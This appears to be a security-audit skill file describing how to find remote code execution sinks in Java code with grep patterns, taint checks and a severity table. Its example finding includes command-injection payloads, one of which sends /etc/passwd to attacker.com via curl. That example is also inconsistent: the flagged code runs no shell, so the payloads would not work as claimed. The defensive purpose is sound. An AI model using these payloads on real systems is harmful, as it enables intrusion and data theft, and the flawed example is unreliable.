# SKILL: sast-rce — Remote Code Execution Detection

## Purpose

Identify code paths where attacker-controlled input reaches OS command execution, Java reflection, expression language evaluation, scripting engines, or code generation sinks that can result in arbitrary code execution.

---

## Phase 1: Sink Discovery

### 1.1 — OS Command Execution

```bash
# Runtime.exec() — most common RCE sink
grep -rn "Runtime\.getRuntime()\.exec\|Runtime\.exec(" --include="*.java"

# ProcessBuilder — modern alternative, equally dangerous
grep -rn "new ProcessBuilder\|ProcessBuilder(" --include="*.java"

# ProcessBuilder.command() — especially if list is built dynamically
grep -rn "\.command(" --include="*.java" -A3

# Shell invocation via exec (sh -c, cmd /c)
grep -rn '"sh"\s*,\s*"-c"\|"cmd"\s*,\s*"/c"\|"/bin/sh"\s*,\s*"-c"' --include="*.java"

# Apache Commons Exec
grep -rn "CommandLine\b\|DefaultExecutor\|Executor\.execute\|org\.apache\.commons\.exec" --include="*.java"

# Groovy shell execution
grep -rn "\.execute()\b" --include="*.java" | grep -v "//\|test\|Test\|mock\|Mock"
```

### 1.2 — Expression Language Injection

```bash
# Spring SpEL — ExpressionParser + parseExpression
grep -rn "ExpressionParser\|SpelExpressionParser\|StandardEvaluationContext\|SimpleEvaluationContext\|parseExpression\|getValue" --include="*.java"

# Template engines — Freemarker, Velocity, Thymeleaf, Pebble
grep -rn "Template\.process\|VelocityEngine\|Velocity\.evaluate\|Configuration\.getTemplate\|TemplateEngine\.process\|PebbleEngine" --include="*.java"

# JSP/JSTL EL evaluation
grep -rn "ExpressionEvaluator\|JspApplicationContext\|ELContext\|ELResolver" --include="*.java"

# OGNL (Struts, MyBatis)
grep -rn "Ognl\.getValue\|OgnlContext\|OgnlException\|#\{.*request\|#\{.*param" --include="*.java" --include="*.xml"

# MVEL
grep -rn "MVEL\.eval\|MVEL\.execute\|MVELInterpretedRuntime" --include="*.java"
```

### 1.3 — Scripting Engine Execution

```bash
# javax.script / nashorn
grep -rn "ScriptEngineManager\|ScriptEngine\|\.eval(\|\.compile(" --include="*.java"

# Groovy dynamic compilation
grep -rn "GroovyShell\|GroovyClassLoader\|GroovyScriptEngine\|Script\.run\|Binding\.setVariable" --include="*.java"

# BeanShell
grep -rn "bsh\.Interpreter\|bsh\.EvalError\|Interpreter\.eval(" --include="*.java"

# Janino / Codehaus
grep -rn "SimpleCompiler\|ScriptEvaluator\|org\.codehaus\.janino\|org\.codehaus\.commons\.compiler" --include="*.java"
```

### 1.4 — Java Reflection (Dynamic Class Loading)

```bash
# Class.forName with variable
grep -rn "Class\.forName(" --include="*.java" | grep -v '"[a-zA-Z.]*"'

# ClassLoader.loadClass
grep -rn "\.loadClass(" --include="*.java"

# Method.invoke on user-controlled method/object
grep -rn "Method\.invoke\|\.invoke(" --include="*.java" -B5 | grep -B5 "getMethod\|getDeclaredMethod"

# Constructor.newInstance
grep -rn "\.newInstance(\|Constructor\.newInstance" --include="*.java"

# URLClassLoader with user-controlled URL
grep -rn "URLClassLoader\|new URL(" --include="*.java"

# defineClass — custom class loading
grep -rn "defineClass\b\|ClassDefinition\b" --include="*.java"
```

### 1.5 — Code Generation / Bytecode Manipulation

```bash
# ASM / Javassist / CGlib with dynamic source
grep -rn "ClassWriter\|CtClass\|Enhancer\|net\.sf\.cglib\|javassist\|org\.objectweb\.asm" --include="*.java"

# Dynamic proxy creation
grep -rn "Proxy\.newProxyInstance\|InvocationHandler" --include="*.java" -B3 | grep -B3 "getParameter\|getBody\|request\."

# Java Compiler API
grep -rn "JavaCompiler\|ToolProvider\.getSystemJavaCompiler\|DiagnosticCollector" --include="*.java"
```

### 1.6 — JNDI Injection (Log4Shell / RMI / LDAP)

```bash
# JNDI lookup with variable
grep -rn "InitialContext\|new InitialContext\|\.lookup(" --include="*.java"
grep -rn "JndiTemplate\|JndiObjectFactoryBean" --include="*.java"

# Log4j format strings (Log4Shell)
grep -rn "log\.info\|log\.warn\|log\.error\|log\.debug\|log\.fatal\|LOG\.info\|LOG\.error" --include="*.java" | grep "request\.\|getParameter\|getHeader\|PathVariable\|RequestParam"

# RMI registry
grep -rn "Registry\b\|LocateRegistry\|Naming\.lookup\|RMISecurityManager" --include="*.java"
```

---

## Phase 2: Taint Analysis

For each sink, confirm attacker-controlled input flows in:

### 2.1 — Command Injection Taint

```bash
# Find where exec/ProcessBuilder args come from
grep -rn "exec(\|ProcessBuilder(" --include="*.java" -B10 | grep -B10 "getParameter\|getHeader\|@RequestParam\|@PathVariable\|request\.\|readLine"
```

Check if shell metacharacters are sanitized:
- `;`, `&&`, `||`, `|`, `$()`, `` ` ``, `>`, `<`, `\n`
- URL-encoded variants: `%3B`, `%26%26`, `%7C`

### 2.2 — SpEL Injection Taint

SpEL with `StandardEvaluationContext` can execute arbitrary Java. `SimpleEvaluationContext` is safer (no reflection).

```bash
# StandardEvaluationContext is the dangerous one
grep -rn "StandardEvaluationContext" --include="*.java" -A10 | grep -A10 "setVariable\|parseExpression"
```

Any SpEL expression that includes user input with `StandardEvaluationContext` is CRITICAL.

### 2.3 — Template Injection Taint

```bash
# Freemarker template loaded from user input
grep -rn "getTemplate\|template\.process\|cfg\.getTemplate" --include="*.java" -B10 | grep -B10 "getParameter\|request\.\|@RequestBody"

# Velocity string template from user input
grep -rn "Velocity\.evaluate\|VelocityEngine\.evaluate" --include="*.java" -B5 | grep -B5 "getParameter\|request\."
```

---

## Phase 3: Sanitizer / Safe Pattern Detection

Patterns that reduce or eliminate risk:

```bash
# ProcessBuilder with fixed command array (only arguments vary) — check if args are sanitized
# Safe: new ProcessBuilder("ls", "-la", safeDir)
# Unsafe: new ProcessBuilder("sh", "-c", userInput)

# ScriptEngine with sandboxed context (Nashorn AccessControlContext)
grep -rn "AccessControlContext\|Permissions\|SandboxSecurityManager" --include="*.java"

# SimpleEvaluationContext instead of Standard — much harder to exploit
grep -rn "SimpleEvaluationContext\.forReadOnlyDataBinding\|SimpleEvaluationContext\.forReadWriteDataBinding" --include="*.java"

# Input allow-listing for command parameters
grep -rn "matches\|Pattern\.compile\|^\[a-zA-Z\]" --include="*.java" -B5 | grep -B5 "exec\|ProcessBuilder"
```

---

## Phase 4: Severity Assessment

| Sink | Auth Required | Severity |
|------|--------------|---------|
| `Runtime.exec()` / `ProcessBuilder` | No | CRITICAL |
| `Runtime.exec()` / `ProcessBuilder` | Yes | HIGH |
| SpEL `StandardEvaluationContext` with user input | No | CRITICAL |
| SpEL `StandardEvaluationContext` with user input | Yes | HIGH |
| Freemarker/Velocity template from user input | No | CRITICAL |
| Scripting engine (`eval`) with user input | Any | CRITICAL |
| `Class.forName` with user-controlled class name | Any | HIGH |
| JNDI `lookup` with user-controlled URL | Any | CRITICAL |
| Log4j format string via user-controlled input | Any | CRITICAL |
| Reflection `Method.invoke` on user-controlled target | Any | HIGH |

---

## Finding Format Example

```
### [CRITICAL] RCE — OS Command Injection via ProcessBuilder

**File:** `src/main/java/com/example/DiagnosticsController.java:83`
**CWE:** CWE-78
**CVSS:** 10.0 (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H)

**Taint Path:**
POST /api/diagnostics?host=X → DiagnosticsController.ping(host) → ProcessBuilder([ping, host])

**Vulnerable Code:**
```java
@PostMapping("/api/diagnostics")
public String ping(@RequestParam String host) {
    ProcessBuilder pb = new ProcessBuilder("ping", "-c", "1", host);
    Process p = pb.start();
    return new String(p.getInputStream().readAllBytes());
}
```

**Proof of Concept:**
```
POST /api/diagnostics?host=127.0.0.1;id HTTP/1.1
POST /api/diagnostics?host=127.0.0.1%0aid HTTP/1.1
POST /api/diagnostics?host=127.0.0.1$(curl+attacker.com/$(cat+/etc/passwd)) HTTP/1.1
```

**Remediation:**
- Validate `host` against a strict regex: `^[a-zA-Z0-9.-]{1,253}$`
- Never pass user input as shell command arguments through `sh -c`
- Use `ProcessBuilder` with array form and validate each element
- Prefer a Java DNS/ICMP library over shelling out

**References:** CWE-78, OWASP A03:2021
```
